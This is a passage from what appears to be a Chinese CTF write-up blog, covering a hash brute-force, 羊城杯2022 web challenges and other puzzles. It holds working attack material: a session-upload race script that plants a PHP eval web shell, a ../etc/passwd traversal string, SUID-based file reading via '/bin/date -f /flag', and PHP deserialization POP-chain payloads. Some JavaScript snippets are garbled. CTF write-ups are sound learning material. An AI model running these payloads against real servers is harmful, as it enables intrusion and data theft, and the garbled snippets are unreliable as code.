class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">                    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">                        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">                            <span class="keyword">for</span> o <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">                                a = <span class="string">f&quot;<span class="subst">&#123;st&#125;</span><span class="subst">&#123;i&#125;</span><span class="subst">&#123;j&#125;</span><span class="subst">&#123;k&#125;</span><span class="subst">&#123;l&#125;</span><span class="subst">&#123;m&#125;</span><span class="subst">&#123;n&#125;</span><span class="subst">&#123;o&#125;</span>&quot;</span></span><br><span class="line">                                s = hashlib.sha256()</span><br><span class="line">                                s.update(a.encode())</span><br><span class="line">                                res  = s.hexdigest()</span><br><span class="line">                                <span class="keyword">if</span> res ==<span class="string">&quot;c22a563acc2a587afbfaaaa6d67bc6e628872b00bd7e998873881f7c6fdc62fc&quot;</span>:</span><br><span class="line">                                    <span class="built_in">print</span>(<span class="string">f&quot;flag:<span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line">                                    <span class="built_in">print</span>(<span class="string">f&quot;hash:<span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">                                    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">                                <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hua())</span><br></pre></td></tr></table></figure>

<p>很快得出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag:8617091733716</span><br><span class="line">hash:c22a563acc2a587afbfaaaa6d67bc6e628872b00bd7e998873881f7c6fdc62fc</span><br><span class="line">0</span><br></pre></td></tr></table></figure>


<h3 id="92"><a href="#92" class="headerlink" title="92"></a>92</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag[<span class="number">1</span>]*k1*k2*k3*k4*k5%p=<span class="number">45509</span></span><br><span class="line">flag[<span class="number">2</span>]*flag[<span class="number">1</span>]*k1*flag[<span class="number">1</span>]*k1*k2*flag[<span class="number">1</span>]*k1*k2*k3*flag[<span class="number">1</span>]*k1*k2*k3*k4*<span class="number">45509</span>%p=<span class="number">13220</span></span><br><span class="line"><span class="built_in">hex</span>(flag[<span class="number">2</span>]*flag[<span class="number">1</span>]*k1*flag[<span class="number">1</span>]*k1*k2*flag[<span class="number">1</span>]*k1*k2*k3*flag[<span class="number">1</span>]*k1*k2*k3*k4*%p)</span><br><span class="line"><span class="built_in">hex</span>(flag[<span class="number">2</span>]*flag[<span class="number">1</span>]**<span class="number">5</span>*k1**<span class="number">5</span>*k2**<span class="number">4</span>*k3**<span class="number">3</span>*k4**<span class="number">2</span>*k5%p)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>


<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;etc&#x2F;passwd</p>
<p>“{&quot;updir&quot;:&quot;static&#x2F;uploads&#x2F;4b3cf1ffc9224f4d830c5a29db854d15&quot;,&quot;user&quot;:&quot;Guest&quot;}”</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br><span class="line">reader.<span class="title function_">readAsDataURL</span>(inputBox.<span class="property">files</span>[<span class="number">0</span>]);</span><br><span class="line">reader.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">result</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> file=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;file&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br><span class="line"></span><br><span class="line">reader.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> text=reader.<span class="property">result</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reader.<span class="title function_">readAsText</span>(file);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fso=<span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> f=fso.<span class="title class_">OpenTextFile</span>(<span class="string">&quot;/etc/passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> str=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span>(!f.<span class="property">AtEndOfStream</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> temp=f.<span class="title class_">ReadLine</span>();</span><br><span class="line">            str+=temp[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(str);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br><span class="line"><span class="keyword">var</span> fileUploader = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(“fileUploader”);<span class="comment">//获取input框id来获取文件信息</span></span><br><span class="line">reader.<span class="title function_">readAsText</span>(fileUploader.<span class="property">files</span>[<span class="number">0</span>],“utf-<span class="number">8</span>”);<span class="comment">//设置编码</span></span><br><span class="line">reader.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="literal">undefined</span></span><br><span class="line">data.<span class="title function_">trim</span>().<span class="title function_">split</span>(<span class="string">&#x27;\n&#x27;</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">v, i</span>)&#123;<span class="literal">undefined</span></span><br><span class="line"><span class="variable language_">window</span>[‘str<span class="string">&#x27; + (i+1)] = v</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">console.log(read(&quot;/etc/passwd&quot;));</span></span><br></pre></td></tr></table></figure>

<h1 id="羊城杯2022"><a href="#羊城杯2022" class="headerlink" title="羊城杯2022"></a>羊城杯2022</h1><h2 id="web-9"><a href="#web-9" class="headerlink" title="web"></a>web</h2><h3 id="1-1-rce-me"><a href="#1-1-rce-me" class="headerlink" title="1-1 rce_me"></a>1-1 rce_me</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/date</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line">url = <span class="string">&quot;http://80.endpoint-04581a9c40334aecbc5427f8e35071f5.dasc.buuoj.cn:81/&quot;</span></span><br><span class="line">sessid = <span class="string">&quot;hua&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    filebytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="comment"># f = open(&#x27;1.php&#x27;,&#x27;rb&#x27;).read()</span></span><br><span class="line">    <span class="comment"># payload = &#x27;?file=/tmp/sess%5fhua&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">       <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">   &lt;?php</span></span><br><span class="line"><span class="string">echo &quot;muhua_cmd--------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">file_put_contents(&#x27;/var/www/html/%68%75%61&#x27;,&#x27;&lt;?php @eval($_POST[1]);&#x27;);</span></span><br><span class="line"><span class="string">echo &quot;</span></span><br><span class="line"><span class="string">-----------------this is end-------------&quot;;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">       &#125;</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    cookies = &#123;</span><br><span class="line">           <span class="string">&#x27;PHPSESSID&#x27;</span>: sessid</span><br><span class="line">           &#125;</span><br><span class="line">    </span><br><span class="line">    files = &#123;</span><br><span class="line">               <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;muhua.jpg&#x27;</span>, filebytes)</span><br><span class="line">               &#125;</span><br><span class="line">    res = session.post(url=url,data=data,cookies=cookies,files=files)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">            write(session)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>同时打开bp发一下包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=/tmp/sess%5fhua&amp;a=§1§ HTTP/1.1</span><br><span class="line">Host: 80.endpoint-04581a9c40334aecbc5427f8e35071f5.dasc.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-For: 123.123.123.123</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br></pre></td></tr></table></figure>


<p>bp攻击，让它包含一下执行，文件上传</p>
<blockquote>
<p>?file&#x3D;%%2568%2575%2561</p>
</blockquote>
<p>然后就可以使用蚁剑连上去了</p>
<p>赛后：<br>真是那个date报错出的，我真的无语了，然后一开始连不上去，所以得不到报错信息，后来连上去又没试过了<br>蚁剑连上后，打开交互，直接执行：<code>/bin/date -f /flag</code>报错即可输出内容</p>
<p>1-2 step_by_step_v3<br>反序列化，ban的太离谱了，直接执行phpinfo函数，在页面中找到flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;y1-&gt;<span class="title function_ invoke__">magic</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;y1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hint</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span>(<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$hey_mean_then</span>/is&quot;</span>, <span class="variable">$file</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c1-&gt;flag = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c1-&gt;<span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$k1</span>,<span class="variable">$k2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$n1</span>,<span class="variable">$n2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ans&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ans&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>简单题：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">cheng</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c1 = <span class="keyword">new</span> <span class="title class_">bei</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c1-&gt;b1 = <span class="keyword">new</span> <span class="title class_">yang</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c1-&gt;b1-&gt;y1 = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// ans=O:5:&quot;cheng&quot;:1:&#123;s:2:&quot;c1&quot;;O:3:&quot;bei&quot;:1:&#123;s:2:&quot;b1&quot;;O:4:&quot;yang&quot;:1:&#123;s:2:&quot;y1&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="1-6"><a href="#1-6" class="headerlink" title="1-6"></a>1-6</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable language_">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t serialize me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable language_">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line">    <span class="variable">$o</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$pop</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;no pop&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line"><span class="variable">$fun</span> = <span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line"><span class="variable">$fun</span>-&gt;func = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&quot;Test&quot;</span>,<span class="number">1</span>=&gt;<span class="string">&quot;getFlag&quot;</span>);</span><br><span class="line"><span class="variable">$fun</span>-&gt;p = <span class="string">&quot;noexit&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="variable">$fun</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$mu</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$mu</span> = <span class="title function_ invoke__">preg_replace</span>(<span 